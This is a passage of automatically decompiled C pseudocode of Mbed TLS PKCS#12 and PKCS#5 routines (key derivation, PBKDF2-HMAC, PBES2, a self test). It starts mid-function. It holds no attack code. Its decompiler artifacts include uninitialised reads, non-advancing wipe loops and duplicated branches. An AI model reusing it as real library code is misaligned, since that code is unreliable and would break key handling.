    g3 = g4;
    int32_t v4 = g6; // 0x80644de
    int32_t v5 = g1; // 0x80644e7
    int32_t result = -0x1f80; // 0x8064504_2
    if (a1 < 129) {
        // 0x8064508
        int32_t v6;
        g7 = &v6;
        int32_t v7 = 0;
        v6 = 0;
        int32_t v8;
        memset((char *)&v8, 0, 0);
        *(int16_t *)(int32_t)&v8 = 0;
        g4 = v5;
        int32_t v9 = v5 + 8; // 0x8064561
        int32_t * v10 = (int32_t *)v9; // 0x8064561_0
        if (*(int32_t *)v5 == 48) {
            int32_t v11 = *(int32_t *)(v5 + 4) + *v10; // 0x806458b
            g5 = v11;
            int32_t * v12 = (int32_t *)(0x1000000 * v9 / 0x1000000);
            int32_t v13 = mbedtls_asn1_get_tag(v12, v11, (int32_t)&v7, 4); // 0x80645aa
            int32_t v14 = v13; // 0x80645bd
            int32_t v15 = 0; // 0x806469e23
            int32_t v16; // 0x80645d8
            int32_t v17; // 0x806461f
            int32_t v18; // 0x806467e
            int32_t v19;
            int32_t v20; // 0x80645e2
            int32_t v21; // 0x80645d4
            char v22; // 0x80645d0
            int32_t v23; // 0x806469e22
            if (v13 == 0) {
                int32_t v24 = *v10; // 0x806469e
                *v10 = *v10 + v7;
                int32_t v25 = mbedtls_asn1_get_int(v12, g5, &v19); // 0x80646be
                if (v25 == 0) {
                    // 0x80646d1
                    g4 = v5;
                    result = -0x1ee6;
                    if (g5 == *v10) {
                        v23 = v24;
                        // 0x80645ca
                        v20 = 2;
                        if (a1 != 0) {
                            // 0x80645ce
                            v21 = 0;
                            v22 = *(char *)(g3 + v21);
                            *(char *)((2 * v21 | 1) + g7) = v22;
                            v16 = 1;
                            // branch -> 0x80645d0
                            while (v16 != a1) {
                                // 0x80645d0
                                v21 = v16;
                                v22 = *(char *)(g3 + v21);
                                *(char *)((2 * v21 | 1) + g7) = v22;
                                v16++;
                                // continue -> 0x80645d0
                            }
                            // 0x80645df
                            v20 = 2 * v16 + 2;
                            // branch -> 0x80645df
                        }
                        // 0x80645df
                        g3 = v20;
                        v17 = mbedtls_pkcs12_derivation((char *)a2, a3, (char *)g7, v20, v23, (char *)v7, v4, 1, v19, 0);
                        if (v17 == 0) {
                            // 0x806462c
                            g4 = a5;
                            if (a5 != 0) {
                                // 0x8064637
                                if (a4 != 0) {
                                    // 0x8064642
                                    v18 = mbedtls_pkcs12_derivation((char *)a4, a5, (char *)g7, g3, v23, (char *)v7, v4, 2, v19, 0);
                                    result = v18;
                                    // branch -> 0x80644fa
                                } else {
                                    result = 0;
                                }
                            } else {
                                result = 0;
                            }
                        } else {
                            result = v17;
                        }
                    }
                    // 0x80644fa
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return result;
                }
                v14 = v25;
                v15 = v24;
            }
            int32_t v26 = v14 - 0x1e80; // 0x80645bd
            if (v26 == 0) {
                v23 = v15;
                // 0x80645ca
                v20 = 2;
                if (a1 != 0) {
                    // 0x80645ce
                    v21 = 0;
                    v22 = *(char *)(g3 + v21);
                    *(char *)((2 * v21 | 1) + g7) = v22;
                    v16 = 1;
                    // branch -> 0x80645d0
                    while (v16 != a1) {
                        // 0x80645d0
                        v21 = v16;
                        v22 = *(char *)(g3 + v21);
                        *(char *)((2 * v21 | 1) + g7) = v22;
                        v16++;
                        // continue -> 0x80645d0
                    }
                    // 0x80645df
                    v20 = 2 * v16 + 2;
                    // branch -> 0x80645df
                }
                // 0x80645df
                g3 = v20;
                v17 = mbedtls_pkcs12_derivation((char *)a2, a3, (char *)g7, v20, v23, (char *)v7, v4, 1, v19, 0);
                if (v17 == 0) {
                    // 0x806462c
                    g4 = a5;
                    if (a5 == 0) {
                        // 0x80644fa
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        return 0;
                    }
                    // 0x8064637
                    if (a4 != 0) {
                        // 0x8064642
                        v18 = mbedtls_pkcs12_derivation((char *)a4, a5, (char *)g7, g3, v23, (char *)v7, v4, 2, v19, 0);
                        result = v18;
                        // branch -> 0x80644fa
                    } else {
                        result = 0;
                    }
                    // 0x80644fa
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return result;
                }
                result = v17;
            } else {
                result = v26;
            }
        } else {
            result = -0x1ee2;
        }
    }
    // 0x80644fa
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return result;
}

// Address range: 0x8064710 - 0x80648cf
int32_t mbedtls_pkcs12_pbe(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g5; // 0x8064713
    int32_t v3 = g7; // 0x8064714
    int32_t v4 = g3; // bp-16
    int32_t v5 = 0; // bp-32
    int32_t v6 = mbedtls_cipher_info_from_type(a3); // 0x8064729
    g7 = v6;
    if (v6 == 0) {
        // 0x8064770
        g3 = v4;
        g7 = v3;
        g5 = v2;
        return -0x1f00;
    }
    int32_t v7 = *(int32_t *)(v6 + 16); // 0x8064739
    int32_t v8;
    int32_t v9 = &v8; // 0x806473c_0
    g3 = v9;
    g4 = a5;
    g6 = a4;
    int32_t v10;
    int32_t v11 = &v10; // 0x806474c_0
    int32_t v12 = *(int32_t *)(v6 + 8) / 8; // 0x8064756
    g5 = v12;
    g1 = a1;
    int32_t result = pkcs12_pbe_derive_key_iv(a6, v11, v12, v9, v7, 0, 0, 0); // 0x8064767
    if (result != 0) {
        // 0x8064770
        g3 = v4;
        g7 = v3;
        g5 = v2;
        return result;
    }
    // 0x8064780
    int32_t v13;
    mbedtls_cipher_init((char *)&v13);
    int32_t v14 = g7; // 0x8064794
    int32_t v15 = mbedtls_cipher_setup((char *)&v13, v14); // 0x806479b
    g1 = v15;
    if (v15 == 0) {
        // 0x80647ef
        mbedtls_cipher_setkey(&v13, v11, 8 * g5, a2, v7, 0, 0, 0);
        g1 = -0x6100;
        v14 = v11;
        // branch -> 0x80647a7
    }
    // 0x80647a7
    *(char *)v11 = 0;
    int32_t v16 = v11 + 1; // 0x80647b3
    g4 = v16;
    // branch -> 0x80647b0
    while (v16 != g3) {
        // 0x80647b0
        *(char *)v16 = 0;
        v16 = v11 + 1;
        g4 = v16;
        // continue -> 0x80647b0
    }
    *(char *)v16 = 0;
    int32_t v17 = g4 + 1; // 0x80647c3
    g4 = v17;
    while (v17 != (int32_t)&v5) {
        // 0x80647c0
        *(char *)v17 = 0;
        v17 = g4 + 1;
        g4 = v17;
        // continue -> 0x80647c0
    }
    // 0x80647ca
    mbedtls_cipher_free((char *)&v13, v14);
    g3 = v4;
    g7 = v3;
    g5 = v2;
    return g1;
}

// Address range: 0x80648d0 - 0x806498f
int32_t mbedtls_pkcs12_pbe_sha1_rc4_128(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = g7; // 0x80648d3
    int32_t v2 = g3; // bp-12
    int32_t v3;
    g3 = &v3;
    int32_t v4;
    g7 = &v4;
    mbedtls_arc4_init((char *)&v3);
    g6 = 4;
    g4 = a3;
    g1 = a1;
    int32_t result = pkcs12_pbe_derive_key_iv(a4, g7, 16, 0, 0, 0, 0, 0); // 0x8064919
    g1 = result;
    int32_t v5;
    if (result != 0) {
        // 0x8064922
        g3 = v2;
        g7 = v1;
        g2 = v5;
        return result;
    }
    // 0x8064930
    mbedtls_arc4_setup((int32_t *)g3, g7, 16);
    int32_t v6;
    mbedtls_arc4_crypt((int32_t *)g3, a6, a5, v6);
    *(char *)g7 = 0;
    int32_t v7 = g7 + 1; // 0x806496b
    g7 = v7;
    // branch -> 0x8064968
    while (v7 != (int32_t)&v2) {
        // 0x8064968
        *(char *)v7 = 0;
        v7 = g7 + 1;
        g7 = v7;
        // continue -> 0x8064968
    }
    // 0x8064972
    mbedtls_arc4_free((char *)g3);
    g1 = 0;
    g3 = v2;
    g7 = v1;
    g2 = v5;
    return 0;
}

// Address range: 0x8064990 - 0x8064b6f
int32_t mbedtls_pkcs5_pbkdf2_hmac(char * a1, char * a2, int32_t a3, int32_t a4, int32_t a5, uint32_t a6, int32_t a7, int32_t a8) {
    int32_t v1 = g5; // 0x8064993
    int32_t v2 = g7; // 0x8064994
    int32_t v3 = g3; // bp-16
    uint32_t v4 = mbedtls_md_get_size(*(int32_t *)a1); // 0x80649a4
    g6 = a7;
    int32_t v5 = 0; // bp-32
    int32_t result2; // 0x8064b66_2
    if (a7 == 0) {
        // 0x8064b5a
        result2 = 0;
        // branch -> 0x8064b5c
    } else {
        // 0x80649bb
        int32_t v6;
        g3 = &v6;
        g7 = v4 % 256;
        int32_t v7 = 1;
        int32_t v8;
        g5 = &v8;
        int32_t v9 = (int32_t)a2;
        g6 = v9;
        int32_t v10 = mbedtls_md_hmac_starts((int32_t *)a1, v9, a3); // 0x80649e875
        if (v10 == 0) {
            while (true) {
                // 0x80649f5
                g6 = a4;
                g4 = (int32_t)a1;
                int32_t v11 = mbedtls_md_hmac_update((int32_t *)a1, a4, a5); // 0x8064a09
                if (v11 == 0) {
                    // 0x8064a16
                    g6 = (int32_t)a1;
                    int32_t v12 = mbedtls_md_hmac_update((int32_t *)a1, (int32_t)&v5, 4); // 0x8064a2b
                    if (v12 == 0) {
                        // 0x8064a38
                        g4 = (int32_t)a1;
                        int32_t result = mbedtls_md_hmac_finish((int32_t *)a1, g3); // 0x8064a42
                        if (result != 0) {
                            // 0x8064b67
                            // branch -> 0x8064b5c
                            // 0x8064b5c
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            return result;
                        }
                        // 0x8064a55
                        memcpy((char *)g5, (char *)g3, g7);
                        int32_t v13; // 0x8064b08
                        int32_t v14; // 0x8064b04
                        int32_t v15; // 0x8064b4f
                        if (a6 < 2) {
                            // 0x8064a55
                            v13 = g7;
                            // branch -> 0x8064af8
                            // 0x8064af8
                            v15 = a7;
                            if (a7 > v13) {
                              lab_if_8064b08_0_true:
                                // if_8064b08_0_true
                                v15 = v13;
                                // branch -> after_if_8064b08_0
                            }
                          lab_after_if_8064b08_0:
                            // after_if_8064b08_0
                            memcpy((char *)a8, (char *)v14, v15);
                            g6 = v15;
                            int32_t v16 = (int32_t)*(char *)&v7 + 1; // 0x8064b35
                            g4 = v16;
                            *(char *)&v7 = (char)v16;
                            if (a7 == v15) {
                                // 0x8064b67
                                // branch -> 0x8064b5c
                                // 0x8064b5c
                                g3 = v3;
                                g7 = v2;
                                g5 = v1;
                                return 0;
                            }
                            // 0x8064b4f
                            g6 = v9;
                            int32_t v17 = mbedtls_md_hmac_starts((int32_t *)a1, v9, a3); // 0x80649e8
                            if (v17 != 0) {
                                result2 = v17;
                                // break -> 0x8064b5c
                                break;
                            }
                            a8 += v15;
                            a7 -= v15;
                            // continue -> 0x80649f5
                            continue;
                        }
                        int32_t v18 = 1; // 0x8064ae625
                        while (true) {
                            // 0x8064a80
                            g6 = v9;
                            if (mbedtls_md_hmac_starts((int32_t *)a1, v9, a3) == 0) {
                                // 0x8064aa1
                                if (mbedtls_md_hmac_update((int32_t *)a1, g5, g7) == 0) {
                                    // 0x8064abc
                                    g6 = (int32_t)a1;
                                    int32_t v19 = mbedtls_md_hmac_finish((int32_t *)a1, g5); // 0x8064ac6
                                    int32_t v20 = v19; // eax
                                    if (v19 == 0) {
                                        // 0x8064ad3
                                        int32_t v21; // 0x8064ae6
                                        if (g7 != 0) {
                                            int32_t v22 = 0; // 0x8064adc
                                            char * v23 = (char *)(g3 + v22); // 0x8064adc_0
                                            *v23 = *v23 ^ *(char *)(g5 + v22);
                                            int32_t v24 = v20 + 1; // 0x8064adf
                                            int32_t v25 = g7; // 0x8064ae2
                                            while (v24 < v25) {
                                                // 0x8064ad8
                                                v22 = v24;
                                                v23 = (char *)(g3 + v22);
                                                *v23 = *v23 ^ *(char *)(g5 + v22);
                                                v24++;
                                                v25 = g7;
                                                // continue -> 0x8064ad8
                                            }
                                            // 0x8064ae6
                                            v21 = v18 + 1;
                                            if (v21 >= a6) {
                                                v13 = v25;
                                                // break -> 0x8064af8
                                                break;
                                            }
                                            v18 = v21;
                                            // continue -> 0x8064a80
                                            continue;
                                        }
                                        // 0x8064ae6
                                        v21 = v18 + 1;
                                        if (v21 >= a6) {
                                            v13 = 0;
                                            // break -> 0x8064af8
                                            break;
                                        }
                                        v18 = v21;
                                        // continue -> 0x8064a80
                                        continue;
                                    }
                                }
                            }
                        }
                        // 0x8064af8
                        v14 = g3;
                        if (a7 > v13) {
                            goto lab_if_8064b08_0_true;
                        }
                        v15 = a7;
                        goto lab_after_if_8064b08_0;
                    } else {
                        result2 = v12;
                    }
                } else {
                    result2 = v11;
                }
            }
        } else {
            result2 = v10;
        }
    }
    // 0x8064b5c
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return result2;
}

// Address range: 0x8064b70 - 0x8064cef
int32_t mbedtls_pkcs5_self_test(int32_t a1) {
    int32_t v1 = g5; // 0x8064b73
    int32_t v2 = g7; // 0x8064b74
    int32_t v3 = g3; // 0x8064b75
    int32_t v4;
    int32_t v5 = &v4; // 0x8064b7c_0
    mbedtls_md_init(&v4);
    int32_t v6 = mbedtls_md_info_from_type(4); // 0x8064b8e
    int32_t result;
    if (v6 == 0) {
        result = 1;
        // 0x8064c7f
        g1 = v5;
        mbedtls_md_free((char *)&v4);
        g1 = result;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return result;
    }
    // 0x8064b9b
    g1 = v5;
    int32_t v7 = mbedtls_md_setup(&v4, v6, 1); // 0x8064bad
    result = 1;
    if (v7 == 0) {
        // 0x8064bba
        int32_t str2;
        int32_t v8 = &str2; // 0x8064bba_0
        g3 = 0;
        int32_t v9 = 0; // 0x8064c9b
        int32_t v10 = 0; // 0x8064c98
        char * v11 = "salt";
        // branch -> 0x8064bcb
        while (true) {
            // 0x8064bcb
            g7 = a1;
            int32_t v12 = v9; // 0x8064c0b
            if (a1 != 0) {
                // 0x8064c98
                printf("  PBKDF2 (SHA1) #%d: ", v9);
                v12 = g3;
                // branch -> 0x8064bd6
            }
            int32_t v13 = 4 * v12; // 0x8064bd9
            int32_t n = *(int32_t *)(v13 + (int32_t)&g117); // 0x8064bd9
            int32_t v14 = *(int32_t *)(v13 + (int32_t)&g118); // 0x8064be4
            int32_t v15 = *(int32_t *)(v13 + (int32_t)&g119); // 0x8064bf6
            int32_t v16 = (int32_t)v11;
            int32_t v17 = *(int32_t *)(v13 + (int32_t)&g120); // 0x8064c0b
            int32_t v18 = mbedtls_pkcs5_pbkdf2_hmac((char *)&v4, (char *)(v10 + (int32_t)"password"), v17, v16, v15, v14, n, v8); // 0x8064c26
            g4 = n;
            if (v18 == 0) {
                // 0x8064c38
                g5 = v8;
                int32_t str = v10 + (int32_t)&g121; // 0x8064c3b
                g7 = str;
                uint32_t strncmp_rc = strncmp((char *)str, (char *)&str2, n);
                g4 = strncmp_rc;
                g237 = strncmp_rc % 2 == 0;
                if (strncmp_rc % 2 == 0) {
                    // 0x8064c47
                    g4 = a1;
                    if (a1 != 0) {
                        // 0x8064cb8
                        puts("passed");
                        // branch -> 0x8064c4e
                    }
                    int32_t v19 = g3 + 1; // 0x8064c4e
                    g3 = v19;
                    if (v19 == 6) {
                        // break -> 0x8064c61
                        break;
                    }
                    v9 = v19;
                    v10 += 32;
                    v11 = (char *)(v16 + 40);
                    // continue -> 0x8064bcb
                    continue;
                }
            }
            // 0x8064c70
            g3 = a1;
            if (a1 == 0) {
                result = 1;
                // 0x8064c7f
                g1 = v5;
                mbedtls_md_free((char *)&v4);
                g1 = result;
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return result;
            }
            // 0x8064cd0
            puts("failed");
            result = 1;
            // branch -> 0x8064c7f
            // 0x8064c7f
            g1 = v5;
            mbedtls_md_free((char *)&v4);
            g1 = result;
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return result;
        }
        // 0x8064c61
        putchar(10);
        result = 0;
        // branch -> 0x8064c7f
    }
    // 0x8064c7f
    g1 = v5;
    mbedtls_md_free((char *)&v4);
    g1 = result;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return result;
}

// Address range: 0x8064cf0 - 0x806506f
int32_t mbedtls_pkcs5_pbes2(int32_t * a1, int32_t a2, char * a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = g3; // 0x8064d01
    int32_t v3 = g7; // 0x8064d04
    int32_t v4 = g5; // 0x8064d07
    int32_t v5 = *(int32_t *)(v1 + 8); // 0x8064d0d
    g4 = v5;
    if (*a1 != 48) {
        // 0x8064d15
        g3 = v2;
        g7 = v3;
        g5 = v4;
        return -0x2f62;
    }
    int32_t v6 = *(int32_t *)(v1 + 4) + v5; // 0x8064d28
    int32_t v7;
    g3 = &v7;
    v7 = v5;
    int32_t v8 = 0;
    int32_t v9 = 0;
    int32_t v10;
    int32_t v11;
    int32_t v12 = mbedtls_asn1_get_alg(&v7, v6, &v10, (char *)&v11); // 0x8064d61
    if (v12 != 0) {
        // 0x8064d6a
        g3 = v2;
        g7 = v3;
        g5 = v4;
        return v12 - 0x2f00;
    }
    // 0x8064d7c
    int32_t v13;
    if (v13 == 9) {
        // 0x8064d89
        int32_t str;
        uint32_t strncmp_rc = strncmp((char *)&g115, (char *)str, 9);
        g4 = strncmp_rc;
        g237 = strncmp_rc % 2 == 0;
        if (strncmp_rc % 2 == 0) {
            int32_t result2 = -0x2f62; // 0x8064d21_2
            if (v11 == 48) {
                // 0x8064db1
                int32_t v14;
                int32_t v15;
                int32_t v16 = v14 + v15; // 0x8064db1
                g7 = v16;
                int32_t v17;
                g5 = &v17;
                v17 = v14;
                int32_t v18;
                int32_t v19 = mbedtls_asn1_get_tag(&v17, v16, (int32_t)&v18, 4); // 0x8064dd0
                int32_t v20 = v19; // 0x8064ddd
                int32_t v21; // 0x8064faa_0
                int32_t v22; // 0x8064df1
                int32_t v23; // 0x8064e1b
                int32_t v24; // 0x8064e45
                int32_t v25; // 0x8064f80
                int32_t v26; // 0x8064fe1
                int32_t v27; // 0x8064ff1
                int32_t v28;
                int32_t v29;
                int32_t v30;
                int32_t v31;
                int32_t v32;
                int32_t v33;
                int32_t v34;
                int32_t v35;
                int32_t v36;
                char * v37;
                int32_t result; // 0x8064f89
                int32_t v38; // 0x8064e6b
                int32_t v39; // 0x8064fb4
                int32_t v40; // 0x8064fbe
                int32_t v41; // 0x8064fc5
                int32_t v42; // 0x8064fea
                int32_t v43; // 0x8064ddd
                if (v19 == 0) {
                    // 0x8064e6b
                    v38 = v17;
                    v17 = v18 + v38;
                    int32_t v44 = mbedtls_asn1_get_int((int32_t *)g5, g7, &v9); // 0x8064e85
                    if (v44 == 0) {
                        int32_t v45 = g7; // 0x8064e92
                        if (v45 != v17) {
                            int32_t v46 = mbedtls_asn1_get_int((int32_t *)g5, v45, &v8); // 0x8064ea9
                            if (v46 != 0) {
                                // 0x8064eb2
                                if (v46 != -98) {
                                    // 0x8064ddd
                                    v43 = v46 - 0x2f00;
                                    result2 = v43;
                                    if (v43 == 0) {
                                        // 0x8064dea
                                        v22 = mbedtls_md_info_from_type(4);
                                        if (v22 != 0) {
                                            // 0x8064e00
                                            g7 = &v34;
                                            v23 = mbedtls_asn1_get_alg((int32_t *)g3, v6, &v34, (char *)&v28);
                                            if (v23 != 0) {
                                                // 0x8064d6a
                                                g3 = v2;
                                                g7 = v3;
                                                g5 = v4;
                                                return v23 - 0x2f00;
                                            }
                                            // 0x8064e28
                                            if (mbedtls_oid_get_cipher_alg(g7, &v33) == 0) {
                                                // 0x8064e3f
                                                v24 = mbedtls_cipher_info_from_type(v33);
                                                g5 = v24;
                                                if (v24 != 0) {
                                                    // 0x8064e54
                                                    if (v28 == 4) {
                                                        // 0x8064f24
                                                        if (v36 == *(int32_t *)(v24 + 16)) {
                                                            // 0x8064f30
                                                            g7 = &v29;
                                                            g3 = &v32;
                                                            v8 = *(int32_t *)(v24 + 8) / 8;
                                                            mbedtls_md_init(&v29);
                                                            mbedtls_cipher_init((char *)g3);
                                                            memcpy((char *)&v31, (char *)v35, v36);
                                                            g1 = v22;
                                                            v25 = mbedtls_md_setup((int32_t *)g7, v22, 1);
                                                            g1 = v25;
                                                            result = v25;
                                                            v37 = (char *)v22;
                                                            if (v25 == 0) {
                                                                // 0x8064faa
                                                                v21 = &v30;
                                                                v39 = v8;
                                                                v40 = v9;
                                                                v41 = v18;
                                                                v26 = mbedtls_pkcs5_pbkdf2_hmac((char *)g7, a3, a4, v38, v41, v40, v39, v21);
                                                                g1 = v26;
                                                                if (v26 == 0) {
                                                                    // 0x8064fea
                                                                    v42 = g5;
                                                                    v27 = mbedtls_cipher_setup((char *)g3, v42);
                                                                    g1 = v27;
                                                                    if (v27 == 0) {
                                                                        // 0x8064ffa
                                                                        mbedtls_cipher_setkey((int32_t *)g3, v21, 8 * v8, a2, v41, v40, v39, v21);
                                                                        g1 = -0x6100;
                                                                        result = -0x6100;
                                                                        v37 = (char *)&v30;
                                                                        // branch -> 0x8064f89
                                                                    } else {
                                                                        result = v27;
                                                                        v37 = (char *)v42;
                                                                    }
                                                                } else {
                                                                    result = v26;
                                                                    v37 = a3;
                                                                }
                                                            }
                                                            // 0x8064f89
                                                            g1 = mbedtls_md_free((char *)g7);
                                                            mbedtls_cipher_free((char *)g3, (int32_t)v37);
                                                            // branch -> 0x8064d15
                                                            // 0x8064d15
                                                            g3 = v2;
                                                            g7 = v3;
                                                            g5 = v4;
                                                            return result;
                                                        }
                                                    }
                                                    // 0x8064e61
                                                    // branch -> 0x8064d15
                                                    // 0x8064d15
                                                    g3 = v2;
                                                    g7 = v3;
                                                    g5 = v4;
                                                    return -0x2f00;
                                                }
                                            }
                                        }
                                        // 0x8064d82
                                        result2 = -0x2e80;
                                        // branch -> 0x8064d15
                                    }
                                    // 0x8064d15
                                    g3 = v2;
                                    g7 = v3;
                                    g5 = v4;
                                    return result2;
                                }
                            }
                            int32_t v47 = g7; // 0x8064ebb
                            if (v47 != v17) {
                                // 0x8064ec6
                                int32_t v48;
                                int32_t v49 = mbedtls_asn1_get_alg_null(g5, v47, (int32_t)&v48, 4); // 0x8064ed7
                                if (v49 != 0) {
                                    // 0x8064ddd
                                    v43 = v49 - 0x2f00;
                                    result2 = v43;
                                    if (v43 == 0) {
                                        // 0x8064dea
                                        v22 = mbedtls_md_info_from_type(4);
                                        if (v22 != 0) {
                                            // 0x8064e00
                                            g7 = &v34;
                                            v23 = mbedtls_asn1_get_alg((int32_t *)g3, v6, &v34, (char *)&v28);
                                            if (v23 != 0) {
                                                // 0x8064d6a
                                                g3 = v2;
                                                g7 = v3;
                                                g5 = v4;
                                                return v23 - 0x2f00;
                                            }
                                            // 0x8064e28
                                            if (mbedtls_oid_get_cipher_alg(g7, &v33) == 0) {
                                                // 0x8064e3f
                                                v24 = mbedtls_cipher_info_from_type(v33);
                                                g5 = v24;
                                                if (v24 != 0) {
                                                    // 0x8064e54
                                                    if (v28 == 4) {
                                                        // 0x8064f24
                                                        if (v36 == *(int32_t *)(v24 + 16)) {
                                                            // 0x8064f30
                                                            g7 = &v29;
                                                            g3 = &v32;
                                                            v8 = *(int32_t *)(v24 + 8) / 8;
                                                            mbedtls_md_init(&v29);
                                                            mbedtls_cipher_init((char *)g3);
                                                            memcpy((char *)&v31, (char *)v35, v36);
                                                            g1 = v22;
                                                            v25 = mbedtls_md_setup((int32_t *)g7, v22, 1);
                                                            g1 = v25;
                                                            result = v25;
                                                            v37 = (char *)v22;
                                                            if (v25 == 0) {
                                                                // 0x8064faa
                                                                v21 = &v30;
                                                                v39 = v8;
                                                                v40 = v9;
                                                                v41 = v18;
                                                                v26 = mbedtls_pkcs5_pbkdf2_hmac((char *)g7, a3, a4, v38, v41, v40, v39, v21);
                                                                g1 = v26;
                                                                if (v26 == 0) {
                                                                    // 0x8064fea
                                                                    v42 = g5;
                                                                    v27 = mbedtls_cipher_setup((char *)g3, v42);
                                                                    g1 = v27;
                                                                    if (v27 == 0) {
                                                                        // 0x8064ffa
                                                                        mbedtls_cipher_setkey((int32_t *)g3, v21, 8 * v8, a2, v41, v40, v39, v21);
                                                                        g1 = -0x6100;
                                                                        result = -0x6100;
                                                                        v37 = (char *)&v30;
                                                                        // branch -> 0x8064f89
                                                                    } else {
                                                                        result = v27;
                                                                        v37 = (char *)v42;
                                                                    }
                                                                } else {
                                                                    result = v26;
                                                                    v37 = a3;
                                                                }
                                                            }
                                                            // 0x8064f89
                                                            g1 = mbedtls_md_free((char *)g7);
                                                            mbedtls_cipher_free((char *)g3, (int32_t)v37);
                                                            // branch -> 0x8064d15
                                                            // 0x8064d15
                                                            g3 = v2;
                                                            g7 = v3;
                                                            g5 = v4;
                                                            return result;
                                                        }
                                                    }
                                                    // 0x8064e61
                                                    // branch -> 0x8064d15
                                                    // 0x8064d15
                                                    g3 = v2;
                                                    g7 = v3;
                                                    g5 = v4;
                                                    return -0x2f00;
                                                }
                                            }
                                        }
                                        // 0x8064d82
                                        result2 = -0x2e80;
                                        // branch -> 0x8064d15
                                    }
                                    // 0x8064d15
                                    g3 = v2;
                                    g7 = v3;
                                    g5 = v4;
                                    return result2;
                                }
                                // 0x8064ee4
                                int32_t v50;
                                if (v50 == 8) {
                                    // 0x8064eee
                                    int32_t str2;
                                    if (memcmp((char *)&g116, (char *)str2, 8) == 0) {
                                        // 0x8064f11
                                        result2 = -0x2f66;
                                        if (g7 == v17) {
                                            // 0x8064dea
                                            v22 = mbedtls_md_info_from_type(4);
                                            if (v22 != 0) {
                                                // 0x8064e00
                                                g7 = &v34;
                                                v23 = mbedtls_asn1_get_alg((int32_t *)g3, v6, &v34, (char *)&v28);
                                                if (v23 != 0) {
                                                    // 0x8064d6a
                                                    g3 = v2;
                                                    g7 = v3;
                                                    g5 = v4;
                                                    return v23 - 0x2f00;
                                                }
                                                // 0x8064e28
                                                if (mbedtls_oid_get_cipher_alg(g7, &v33) == 0) {
                                                    // 0x8064e3f
                                                    v24 = mbedtls_cipher_info_from_type(v33);
                                                    g5 = v24;
                                                    if (v24 != 0) {
                                                        // 0x8064e54
                                                        if (v28 == 4) {
                                                            // 0x8064f24
                                                            if (v36 == *(int32_t *)(v24 + 16)) {
                                                                // 0x8064f30
                                                                g7 = &v29;
                                                                g3 = &v32;
                                                                v8 = *(int32_t *)(v24 + 8) / 8;
                                                                mbedtls_md_init(&v29);
                                                                mbedtls_cipher_init((char *)g3);
                                                                memcpy((char *)&v31, (char *)v35, v36);
                                                                g1 = v22;
                                                                v25 = mbedtls_md_setup((int32_t *)g7, v22, 1);
                                                                g1 = v25;
                                                                result = v25;
                                                                v37 = (char *)v22;
                                                                if (v25 == 0) {
                                                                    // 0x8064faa
                                                                    v21 = &v30;
                                                                    v39 = v8;
                                                                    v40 = v9;
                                                                    v41 = v18;
                                                                    v26 = mbedtls_pkcs5_pbkdf2_hmac((char *)g7, a3, a4, v38, v41, v40, v39, v21);
                                                                    g1 = v26;
                                                                    if (v26 == 0) {
                                                                        // 0x8064fea
                                                                        v42 = g5;
                                                                        v27 = mbedtls_cipher_setup((char *)g3, v42);
                                                                        g1 = v27;
                                                                        if (v27 == 0) {
                                                                            // 0x8064ffa
                                                                            mbedtls_cipher_setkey((int32_t *)g3, v21, 8 * v8, a2, v41, v40, v39, v21);
                                                                            g1 = -0x6100;
                                                                            result = -0x6100;
                                                                            v37 = (char *)&v30;
                                                                            // branch -> 0x8064f89
                                                                        } else {
                                                                            result = v27;
                                                                            v37 = (char *)v42;
                                                                        }
                                                                    } else {
                                                                        result = v26;
                                                                        v37 = a3;
                                                                    }
                                                                }
                                                                // 0x8064f89
                                                                g1 = mbedtls_md_free((char *)g7);
                                                                mbedtls_cipher_free((char *)g3, (int32_t)v37);
                                                                // branch -> 0x8064d15
                                                                // 0x8064d15
                                                                g3 = v2;
                                                                g7 = v3;
                                                                g5 = v4;
                                                                return result;
                                                            }
                                                        }
                                                        // 0x8064e61
                                                        // branch -> 0x8064d15
                                                        // 0x8064d15
                                                        g3 = v2;
                                                        g7 = v3;
                                                        g5 = v4;
                                                        return -0x2f00;
                                                    }
                                                }
                                            }
                                            // 0x8064d82
                                            result2 = -0x2e80;
                                            // branch -> 0x8064d15
                                        }
                                        // 0x8064d15
                                        g3 = v2;
                                        g7 = v3;
                                        g5 = v4;
                                        return result2;
                                    }
                                }
                                // 0x8064d82
                                // branch -> 0x8064d15
                                // 0x8064d15
                                g3 = v2;
                                g7 = v3;
                                g5 = v4;
                                return -0x2e80;
                            }
                        }
                        // 0x8064dea
                        v22 = mbedtls_md_info_from_type(4);
                        if (v22 != 0) {
                            // 0x8064e00
                            g7 = &v34;
                            v23 = mbedtls_asn1_get_alg((int32_t *)g3, v6, &v34, (char *)&v28);
                            if (v23 != 0) {
                                // 0x8064d6a
                                g3 = v2;
                                g7 = v3;
                                g5 = v4;
                                return v23 - 0x2f00;
                            }
                            // 0x8064e28
                            if (mbedtls_oid_get_cipher_alg(g7, &v33) == 0) {
                                // 0x8064e3f
                                v24 = mbedtls_cipher_info_from_type(v33);
                                g5 = v24;
                                if (v24 != 0) {
                                    // 0x8064e54
                                    if (v28 == 4) {
                                        // 0x8064f24
                                        if (v36 == *(int32_t *)(v24 + 16)) {
                                            // 0x8064f30
                                            g7 = &v29;
                                            g3 = &v32;
                                            v8 = *(int32_t *)(v24 + 8) / 8;
                                            mbedtls_md_init(&v29);
                                            mbedtls_cipher_init((char *)g3);
                                            memcpy((char *)&v31, (char *)v35, v36);
                                            g1 = v22;
                                            v25 = mbedtls_md_setup((int32_t *)g7, v22, 1);
                                            g1 = v25;
                                            result = v25;
                                            v37 = (char *)v22;
                                            if (v25 == 0) {
                                                // 0x8064faa
                                                v21 = &v30;
                                                v39 = v8;
